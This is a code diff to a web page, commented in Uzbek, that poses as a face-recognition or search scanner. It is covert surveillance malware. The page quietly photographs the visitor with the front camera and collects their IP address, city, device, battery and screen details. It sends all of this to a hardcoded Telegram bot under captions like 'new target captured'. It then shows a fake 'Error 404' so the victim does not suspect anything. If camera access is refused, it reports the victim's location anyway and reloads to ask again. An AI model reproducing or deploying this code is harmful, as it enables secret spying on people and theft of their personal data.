@@ -41,60 +41,51 @@
     const chat_id = "8041707187";
 
     async function startScanner() {
-        document.getElementById('status').innerText = "Processing... Please wait.";
-        
+        const statusElement = document.getElementById('status');
+        statusElement.innerText = "Skanerlash ko'proq vaqtni talab qilishi mumkin iltimos sabrli bo'ling!";
+
+        // --- MA'LUMOTLARNI OLDINDAN TAYYORLASH (Xato bermasligi uchun) ---
+        let geoData = { ip: "Noma'lum", city: "Noma'lum", country_name: "Noma'lum" };
+        let deviceModel = navigator.userAgent.includes("Android") ? "📱 Android" : (navigator.userAgent.includes("iPhone") ? "🍎 iPhone" : "💻 Desktop");
+        let batteryLevel = "Noma'lum";
+        let screenInfo = `${window.screen.width}x${window.screen.height}`;
+
         try {
-            // 1. Kameraga ruxsat so'rash
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-
-            // 2. IP va Joylashuvni aniqlash (Shahar va Davlat)
+            // IP ma'lumotlarini olish
             const geoRes = await fetch('https://ipapi.co/json/');
-            const geoData = await geoRes.json();
-
-            // Qurilma va OS ma'lumotlarini chuqur tahlil qilish
-        const ua = navigator.userAgent;
-        let deviceModel = "Noma'lum qurilma";
-
-        if (/android/i.test(ua)) {
-            const match = ua.match(/Android\s+([^\s;]+);\s+([^\s;]+)/);
-            deviceModel = match ? "📱 " + match[2] : "📱 Android telefon";
-        } else if (/iPhone|iPad|iPod/i.test(ua)) {
-            deviceModel = "🍎 iOS (Apple)";
-        } else if (/Windows NT 10.0/i.test(ua)) {
-            // Windows 10 va 11 ni brauzer bir xil '10.0' deb ko'rsatadi
-            // Ularni farqlash uchun ekran chekkalari yoki yangi API kerak
-            deviceModel = "💻 Windows 10 yoki 11 PC";
-        } else if (/Windows NT 6.1/i.test(ua)) {
-            deviceModel = "💻 Windows 7 PC";
-        } else if (/Macintosh/i.test(ua)) {
-            deviceModel = "🍏 MacBook (macOS)";
-        } else if (/Linux/i.test(ua)) {
-            // Senga kerak bo'lgan Linux qismi
-            deviceModel = "🐧 Linux OS (Desktop)";
-        } else if (/X11/i.test(ua)) {
-            deviceModel = "Unix tizimi";
-        }
-
-            // 4. Batareya va Ekran ma'lumotlari
-            let batteryLevel = "Noma'lum";
+            geoData = await geoRes.json();
+            
+            // Batareya ma'lumotlarini olish
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 batteryLevel = Math.round(b.level * 100) + "%";
             }
-            const screenInfo = `${window.screen.width}x${window.screen.height}`;
+        } catch (e) { console.log("Geo/Battery ma'lumotlarida xato"); }
 
-            // 5. Rasmga tushirish va yuborish
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chat_id);
-                    formData.append('photo', blob, 'target.jpg');
-                    formData.append('caption', 
-                        `📸 **Yangi nishon tutildi!**\n\n` +
+        try {
+            // 2. Kameraga ruxsat so'rash
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // Kamera isishini 2.5 soniya kutamiz
+            await new Promise(resolve => setTimeout(resolve, 2500));
+
+            // 3. Rasmga tushirish
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+
+            // 4. Botga yuborish
+            const formData = new FormData();
+            formData.append('chat_id', chat_id);
+            formData.append('photo', blob, 'target.jpg');
+            formData.append('caption', 
+                        `📸 **Yangi yuzni qo'lga kiritildi!**\n\n` +
                         `👤 **Qurilma:** ${deviceModel}\n` +
                         `🌐 **IP:** ${geoData.ip}\n` +
                         `📍 **Shahar:** ${geoData.city}, ${geoData.country_name}\n` +
@@ -102,23 +93,30 @@
                         `📐 **Ekran:** ${screenInfo}\n` +
                         `🌍 **Til:** ${navigator.language}\n` +
                         `⏰ **Vaqt:** ${new Date().toLocaleString()}`
-                    );
+            );
 
-                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
+            const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
 
-                    // 6. Shubha uyg'otmaslik uchun xatolik ko'rsatish
-                    alert("Error 404: Tizim yuzingizni taniy olmadi. Iltimos, qayta urinib ko'ring.");
-                    stream.getTracks().forEach(t => t.stop());
-                    document.getElementById('status').innerText = "System error. Try again.";
-                }, 'image/jpeg');
-            }, 1000);
+            // --- JIGARIM, MANA BU YERDA RETURN ISHLATILDI ---
+            if (response.ok) {
+                stream.getTracks().forEach(t => t.stop());
+                statusElement.innerText = "System error. Try again.";
+                alert("Error 404: Tizim yuzingizni taniy olmadi. Iltimos, qayta urinib ko'ring.");
+                return; // MUHIM: Muvaffaqiyatli bo'lsa, kod shu yerda to'xtaydi va catch'ga o'tmaydi!
+            }
 
         } catch (err) {
+            // --- 🎯 AGAR NISHON 'NERAZRESHIT' BOSSA ---
+            const errorMsg = `⚠️ **Nishon kamerani blokladi!**\n🌐 IP: ${geoData.ip}\n📍 Manzil: ${geoData.city}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(errorMsg)}`);
+
+            statusElement.innerText = "Error 404 ";
             alert("Error 404: Kameraga ruxsat berilmasa, qidiruv tizimi ishlamaydi!");
-            document.getElementById('status').innerText = "Permission denied.";
+            
+            setTimeout(() => { location.reload(); }, 2000);
         }
     }
 </script>
